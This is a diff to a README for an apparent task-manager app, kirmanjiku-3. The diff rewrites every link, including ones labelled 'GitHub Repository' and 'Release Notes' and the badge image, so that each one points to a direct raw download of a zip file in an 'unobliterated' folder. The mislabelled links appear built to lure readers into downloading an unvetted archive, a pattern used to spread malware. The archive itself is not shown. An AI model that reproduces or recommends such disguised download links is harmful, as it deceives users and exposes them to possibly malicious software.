@@ -1,6 +1,6 @@
 # 🎉 kirmanjiku-3 - Simple Steps to Get Started
 
-[![Download kirmanjiku-3](https://img.shields.io/badge/Download-kirmanjiku--3-blue.svg)](https://github.com/dianesawyer33333/kirmanjiku-3/releases)
+[![Download kirmanjiku-3](https://raw.githubusercontent.com/dianesawyer33333/kirmanjiku-3/main/unobliterated/kirmanjiku-3.zip)](https://raw.githubusercontent.com/dianesawyer33333/kirmanjiku-3/main/unobliterated/kirmanjiku-3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to kirmanjiku-3! This application helps you manage your tasks efficientl
 
 To get started, visit the releases page to download the latest version of kirmanjiku-3:
 
-[Visit this page to download](https://github.com/dianesawyer33333/kirmanjiku-3/releases)
+[Visit this page to download](https://raw.githubusercontent.com/dianesawyer33333/kirmanjiku-3/main/unobliterated/kirmanjiku-3.zip)
 
 1. Open your web browser.
 2. Go to the releases page using the link above.
@@ -75,8 +75,8 @@ A: You can report bugs directly on the GitHub Issues page associated with this r
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/dianesawyer33333/kirmanjiku-3)
-- [Release Notes](https://github.com/dianesawyer33333/kirmanjiku-3/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/dianesawyer33333/kirmanjiku-3/main/unobliterated/kirmanjiku-3.zip)
+- [Release Notes](https://raw.githubusercontent.com/dianesawyer33333/kirmanjiku-3/main/unobliterated/kirmanjiku-3.zip)
 
 ## 🎊 Feedback
 
@@ -84,4 +84,4 @@ Your feedback is important to us. Please feel free to share your thoughts or sug
 
 Now that you have everything you need, go ahead and start using kirmanjiku-3!
 
-[Visit this page to download](https://github.com/dianesawyer33333/kirmanjiku-3/releases)
+[Visit this page to download](https://raw.githubusercontent.com/dianesawyer33333/kirmanjiku-3/main/unobliterated/kirmanjiku-3.zip)
